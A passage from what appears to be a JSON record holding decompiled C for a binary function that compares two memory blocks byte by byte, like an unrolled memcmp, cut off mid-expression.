        "decompiled_code": "\nint32_t __cdecl fcn.0047734e(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\ncode_r0x00477831:\n    // switch table (32 cases) at 0x47894a\n            switch(arg_10h) {\n            case 0:\n                break;\n            case 1:\n                goto code_r0x00478036;\n            case 2:\n                goto code_r0x0047845f;\n            case 3:\n                goto code_r0x00477ff2;\n            case 4:\n                goto code_r0x00477bb6;\n            case 5:\n                goto code_r0x00477fa2;\n            case 6:\n                goto code_r0x004783cc;\n            case 7:\n                goto code_r0x004787e5;\n            case 8:\n                goto code_r0x00477b23;\n            case 9:\n                goto code_r0x00477f0f;\n            case 10:\n                goto code_r0x00478338;\n            case 0xb:\n                goto code_r0x00478752;\n            case 0xc:\n                goto code_r0x00477a90;\n            case 0xd:\n                goto code_r0x00477e7c;\n            case 0xe:\n                goto code_r0x004782a5;\n            case 0xf:\n                goto code_r0x004786bf;\n            case 0x10:\n                goto code_r0x004779fd;\n            case 0x11:\n                goto code_r0x00477de9;\n            case 0x12:\n                goto code_r0x00478212;\n            case 0x13:\n                goto code_r0x0047862b;\n            case 0x14:\n                goto code_r0x0047796a;\n            case 0x15:\n                goto code_r0x00477d56;\n            case 0x16:\n                goto code_r0x0047817f;\n            case 0x17:\n                goto code_r0x00478598;\n            case 0x1a:\n                goto code_r0x004780ec;\n            case 0x1b:\n                goto code_r0x00478505;\n            case 0x1c:\n                uVar1 = *(arg_8h + arg_10h + -0x1c);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1c)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n            case 0x18:\n                uVar1 = *(arg_8h + arg_10h + -0x18);\n                if (uVar1 != *(arg_ch + arg_10h + -0x18)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0047796a:\n                uVar1 = *(arg_8h + arg_10h + -0x14);\n                if (uVar1 != *(arg_ch + arg_10h + -0x14)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004779fd:\n                uVar1 = *(arg_8h + arg_10h + -0x10);\n                if (uVar1 != *(arg_ch + arg_10h + -0x10)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477a90:\n                uVar1 = *(arg_8h + arg_10h + -0xc);\n                if (uVar1 != *(arg_ch + arg_10h + -0xc)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477b23:\n                uVar1 = *(arg_8h + arg_10h + -8);\n                if (uVar1 != *(arg_ch + arg_10h + -8)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477bb6:\n                uVar1 = *(arg_8h + arg_10h + -4);\n                if (uVar1 != *(arg_ch + arg_10h + -4)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -1) - *(arg_ch + arg_10h + -1);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n                break;\n            case 0x1d:\n                uVar1 = *(arg_8h + arg_10h + -0x1d);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1d)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n            case 0x19:\n                if (*(arg_8h + arg_10h + -0x19) != *(arg_ch + arg_10h + -0x19)) {\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477d56:\n                uVar1 = *(arg_8h + arg_10h + -0x15);\n                if (uVar1 != *(arg_ch + arg_10h + -0x15)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477de9:\n                uVar1 = *(arg_8h + arg_10h + -0x11);\n                if (uVar1 != *(arg_ch + arg_10h + -0x11)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477e7c:\n                uVar1 = *(arg_8h + arg_10h + -0xd);\n                if (uVar1 != *(arg_ch + arg_10h + -0xd)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477f0f:\n                uVar1 = *(arg_8h + arg_10h + -9);\n                if (uVar1 != *(arg_ch + arg_10h + -9)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00477fa2:\n                if (*(arg_8h + arg_10h + -5) != *(arg_ch + arg_10h + -5)) {\ncode_r0x00477fae:\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\ncode_r0x00477ff2:\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\ncode_r0x00478014:\n                    iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478036:\n                uVar1 = *(arg_ch + arg_10h + -1);\n                uVar3 = *(arg_8h + arg_10h + -1);\n                if (uVar3 == uVar1) {\n                    return 0;\n                }\n                return (0 < uVar3 - uVar1) * 2 + -1;\n            case 0x1e:\n                uVar1 = *(arg_8h + arg_10h + -0x1e);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1e)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1e);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004780ec:\n                uVar1 = *(arg_8h + arg_10h + -0x1a);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1a)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0047817f:\n                uVar1 = *(arg_8h + arg_10h + -0x16);\n                if (uVar1 != *(arg_ch + arg_10h + -0x16)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478212:\n                uVar1 = *(arg_8h + arg_10h + -0x12);\n                if (uVar1 != *(arg_ch + arg_10h + -0x12)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004782a5:\n                uVar1 = *(arg_8h + arg_10h + -0xe);\n                if (uVar1 != *(arg_ch + arg_10h + -0xe)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478338:\n                if (*(arg_8h + arg_10h + -10) != *(arg_ch + arg_10h + -10)) {\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004783cc:\n                uVar1 = *(arg_8h + arg_10h + -6);\n                if (uVar1 != *(arg_ch + arg_10h + -6)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0047845f:\n                if (*(arg_8h + arg_10h + -2) != *(arg_ch + arg_10h + -2)) goto code_r0x00478014;\n                break;\n            case 0x1f:\n                uVar1 = *(arg_8h + arg_10h + -0x1f);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1f)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1f);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1e) - *(arg_ch + arg_10h + -0x1e);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478505:\n                uVar1 = *(arg_8h + arg_10h + -0x1b);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1b)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478598:\n                uVar1 = *(arg_8h + arg_10h + -0x17);\n                if (uVar1 != *(arg_ch + arg_10h + -0x17)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + 